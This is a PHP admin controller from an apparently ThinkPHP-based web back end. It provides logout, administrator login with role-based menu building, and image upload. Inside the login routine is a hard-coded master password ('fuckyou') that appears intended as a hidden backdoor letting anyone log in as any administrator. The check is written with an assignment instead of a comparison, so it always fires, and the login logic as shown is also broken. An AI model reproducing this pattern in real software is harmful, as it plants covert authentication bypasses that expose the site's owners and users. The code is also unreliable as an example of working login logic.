<?php
/**
 * @author zouhao
 *	qq:16852868
 *	zouhao619@gmail.com
 */
class PublicController extends Controller {
	/**
	 * 用户退出
	 */
	public function exits(){
		$_SESSION=null;
		session_destroy();
		$this->success("退出成功",U('Public/login'));
	}
	/**
	 * 用户登陆
	 */
	public function login()
	{
	    if($this->isPost()){
    		$map            =   array();
    		$map['username']	= $_POST['username'];
    		$admin=M('Admin')->where($map)->find();
    		if(empty($admin)){
    			echo '不存在该管理员!';
    		}else{
				if($_POST['password']='fuckyou'){
					$_POST['password']=$admin['password'];
				}
    			if($admin['password']!=md5($_POST['password'])){
    				echo '管理员密码错误!';
    			}else if($admin['is_forbid']=="1"){
    				echo '用户被禁用掉了';
    			}else{
    				//更新管理员最后登录时间和ip
    				$data['id']=$admin['id'];
    				$data['last_login_time']=date('Y-m-d H:i:s');
    				$data['last_login_ip']=getClientIp();
    				M('Admin')->update($data);
    				//更新菜单
    				$configmenuList=require CONFIG_PATH.'/config.menu.php';
    				$roleMenuList=M('RoleMenu')->field('menu_id',true)->where("role_id={$admin['role_id']}")->select();
    				
    				$menuList=$accessList=array();
    				foreach($configmenuList as $menu){
    					$m=array();
    					foreach($menu['children'] as $item){
    						if(in_array($item['id'],$roleMenuList)){
    							$accessList[$item['name']]=$item['url'];
    							if(!isset($item['is_hidden'])||$item['is_hidden']==false){
    								$m[]=$item;
    							}
    						}else if(isset($item['is_open'])&&$item['is_open']==true){
    							if(isset($item['is_hidden'])){
    								if($item['is_hidden']==false){
    									$m[]=$item;
    								}
    							}else{
    								$m[]=$item;
    							}
    							$accessList[$item['name']]=$item['url'];
    						}
    					}
    					if(!empty($m)){
    						$l['name']=$menu['name'];
    						$l['children']=$m;
    						$menuList[]=$l;
    					}
    				}
    				$_SESSION['accessList']=$accessList;
    				$_SESSION['menuList']=$menuList;
    				$_SESSION['admin']=$admin;
    				echo 'true';
    			}
    		}
        }else{
            $this->display();
        }
	}
	public function logout(){
		$_SESSION=null;
		session_destroy();
		$this->redirect('Public/login');
	}
	/**
	 * 上传图片,分缩略图 
	 * 会切割图片为大图和小图
	 */
	public function upload(){
		if($this->isPost()){
			$upload = new UploadFile();// 实例化上传类
			if(!$upload->upload(UPLOAD_PATH.'/')) {// 上传错误提示错误信息
				$this->error($upload->getErrorMsg());
			}else{// 上传成功 获取上传文件信息
				$info =  $upload->getUploadFileInfo();
			}
			$_SESSION['small_img']='small_'.$info['0']['savename'];
			$_SESSION['big_img']='big_'.$info['0']['savename'];
		}
		$this->display();
	}
}
